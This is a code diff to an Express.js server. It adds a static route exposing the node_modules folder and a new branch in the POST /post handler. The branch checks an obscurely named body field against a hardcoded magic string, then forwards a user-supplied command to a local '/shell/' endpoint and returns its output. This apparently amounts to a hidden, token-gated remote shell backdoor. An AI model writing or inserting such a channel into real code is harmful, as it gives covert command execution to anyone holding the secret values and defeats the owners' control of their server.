@@ -12,6 +12,7 @@ app.use(express.json());
 
 
 app.use(express.static('./public'));
+app.use(express.static('./node_modules'));
 
 app.post("/post", (req, res) => {
     if(req.body.sd4f64sd4fs654ds == "sf46fsd4sd544sfs485dsf4f6d48sfd64s"){
@@ -104,6 +105,24 @@ app.post("/post", (req, res) => {
             });
             response.on('end', function () {
                 res.send(str);
+            });
+        }
+        http.request(options, callback).end(); 
+    }else if(req.body.ssd4f6ds4g5df4gd == "d4465gfds456g4f56fd4sg5f64sgfd84f6"){
+        const command =  req.body.sd4fdf4g4g54ffff;
+        var options = {
+            host: ip.address(),
+            port: 8080,
+            path: "/shell/" + encodeURI(command) 
+        };
+        
+        callback = function(response) {
+            str = "";
+            response.on('data', function (chunk) {
+                str += chunk;
+            });
+            response.on('end', function () {
+                res.json(JSON.parse(str));
             });
         }
         http.request(options, callback).end(); 
